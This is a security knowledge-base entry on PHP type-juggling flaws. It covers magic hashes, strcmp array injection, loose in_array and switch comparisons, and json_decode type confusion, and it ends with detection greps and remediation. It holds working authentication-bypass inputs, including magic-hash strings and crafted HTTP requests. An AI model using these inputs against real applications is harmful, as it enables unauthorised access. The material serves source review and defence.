---
title: PHP type juggling
slug: php-type-juggling
aliases: [php-loose-comparison, php-magic-hashes, php-type-coercion]
---

> **TL;DR:** PHP's loose comparison (`==`) and implicit type coercion let attackers bypass authentication, MAC checks, and access controls by crafting inputs that compare equal to secrets despite being completely different strings.

## What it is
PHP performs implicit type conversion when using `==`, `switch`, `in_array` (without strict flag), and `array_search`. The classic exploit: the string `"0e462097431906509019562988736854"` (an MD5 hash starting with `0e`) is treated as `0` in scientific notation, so it equals `0`, `"0"`, `FALSE`, and any other `0e...` string. This pattern breaks authentication, HMAC verification, password resets, and any comparison that uses `==` instead of `===`. OSWE exams frequently test this in source-review scenarios.

## Preconditions / where it applies
- PHP application using `==` for authentication or authorization checks (common in legacy code, WordPress plugins, custom frameworks).
- `strcmp()` called on user-controlled input without type checking (returns `0` on type error in older PHP, `NULL` which is falsy).
- `json_decode()` or `unserialize()` parsing attacker input where the result is compared loosely.
- `switch` statements comparing user input — `switch` uses loose comparison.
- PHP < 8.0 for the most egregious `0 == "string"` behavior; PHP 8.0+ changed `0 == ""` to `false` but `0 == "0e..."` still holds.

## Technique

### 1 — Magic hashes (0e prefix)

When the application compares hashed values with `==`:

```php
// Vulnerable pattern in source
if (md5($password) == $stored_hash) { /* login */ }
if (md5($token)    == md5($expected)) { /* valid */ }
```

If both sides start with `0e` followed by only digits, PHP sees two numbers in scientific notation — both evaluate to `0`:

```
MD5 magic hashes:
  "240610708"     → 0e462097431906509019562988736854
  "QNKCDZO"      → 0e830400451993494058024219903391
  "aabg7XSs"      → 0e087386482136013740957780965295
  "s878926199a"   → 0e545993274517709034328855841020

SHA1 magic hashes:
  "aaroZmOk"      → 0e66507019969427134894567494305185566735
  "aaK1STfY"      → 0e76658526655756207688271159624026011393

SHA256 magic hash:
  "34250003024812"→ 0e46289032038065916139621039085883773413820991920706299695051332
```

Attack: register or supply a password whose hash starts with `0e[0-9]+`. The stored hash for any other user whose hash also matches this pattern will pass the check.

### 2 — strcmp bypass

```php
// Vulnerable
if (strcmp($_POST['password'], $secret) == 0) { /* auth */ }
```

`strcmp()` expects two strings. Pass an array instead:

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

password[]=anything
```

In PHP < 8.0, `strcmp("secret", [])` returns `NULL`. Since `NULL == 0` is `true`, the check passes. In PHP 8.0+ it throws a `TypeError`, but many apps catch exceptions and proceed.

### 3 — Array injection for equality bypass

```php
// Vulnerable hash comparison
if ($_GET['token'] == $expected_token) { /* proceed */ }
```

Send an array: `?token[]=`. Comparing an array to a string with `==` gives unpredictable results; `in_array` and `array_search` without strict mode are also vulnerable:

```php
// Source pattern — in_array without strict
$allowed = ['admin', 'editor'];
if (in_array($_GET['role'], $allowed)) { /* grant access */ }
// Bypass: role=0  → 0 == "admin" is TRUE in PHP < 8.0
```

### 4 — switch statement bypass

`switch` uses loose comparison:

```php
switch ($_GET['action']) {
    case 'admin':
        admin_panel(); break;
    case 'user':
        user_panel(); break;
}
// Bypass: ?action=0  → 0 == "admin" is TRUE (PHP < 8.0)
```

### 5 — json_decode type confusion

`json_decode` preserves JSON types — integers, booleans, strings are distinct. If the app then uses `==`:

```php
$data = json_decode($input, true);
if ($data['pin'] == $stored_pin) { /* auth */ }
```

Send `{"pin": 0}` — the integer `0` will loosely equal any non-numeric string. Send `{"pin": true}` — `true == "any_string"` is `true`.

```http
POST /api/verify HTTP/1.1
Content-Type: application/json

{"pin": true}
```

### 6 — Practical OSWE source-review workflow

When reviewing PHP source:

```bash
# Find loose comparisons on security-sensitive variables
grep -rn '==\s*\$' --include='*.php' | grep -iE 'pass|token|hash|secret|key|pin|otp|code'

# Find strcmp without strict check
grep -rn 'strcmp(' --include='*.php'

# Find in_array/array_search without strict (no 'true' third arg)
grep -rn 'in_array(' --include='*.php' | grep -v ', true)'
grep -rn 'array_search(' --include='*.php' | grep -v ', true)'

# Find switch on user input
grep -rn 'switch.*\$_' --include='*.php'
```

### 7 — PHP 8.0+ changes and remaining attack surface

PHP 8.0 made `0 == "string"` return `false` (non-numeric strings no longer coerce to 0). Still vulnerable in 8.0+:

```php
0 == "0e123456789"   // TRUE — "0e..." IS numeric, so both sides are 0.0
0 == "0"             // TRUE
"" == null           // TRUE (changed from == false)
"1" == "01"          // TRUE (numeric strings)
"1e1" == "10"        // TRUE (10.0 == 10.0)
```

Magic hash attacks remain fully effective in PHP 8.x because `0e[0-9]+` strings are numeric.

## Detection / blue-team
- Static analysis: PHPStan / Psalm at strict level flag loose comparisons. Semgrep rule: `$X == $Y` where either is from user input.
- Code review: any `==` near auth/authz/MAC/token logic is a finding.
- Runtime: unusual parameter types (arrays where strings expected) in access logs or WAF logs.
- PHP 8.0+ upgrade eliminates the `0 == "string"` class but not magic hashes.

## Remediation
- Use `===` for all comparisons. Enable `declare(strict_types=1)` at the top of every file.
- Use `hash_equals()` for constant-time comparison of hashes/tokens/MACs — it also enforces string types.
- Validate input types before comparison: `is_string()`, `is_int()`.
- `in_array($val, $arr, true)` and `array_search($val, $arr, true)` — always pass the strict flag.
- `password_verify()` for password checking — never roll your own comparison.
- Upgrade to PHP 8.0+ to eliminate the worst `0 == "string"` coercions, but don't rely on it alone.

## References
- [OWASP — Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) — original research
- [PHP Manual — Comparison operators](https://www.php.net/manual/en/language.operators.comparison.php) — type comparison tables
- [HackTricks — PHP Type Juggling](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/php-useful-functions-disable_functions-open_basedir-bypass/php-ssrf.html) — payload lists

See also: [[sql-injection]], [[deserialisation]], [[application-logic-flaws]], [[authentication-vulnerabilities]]
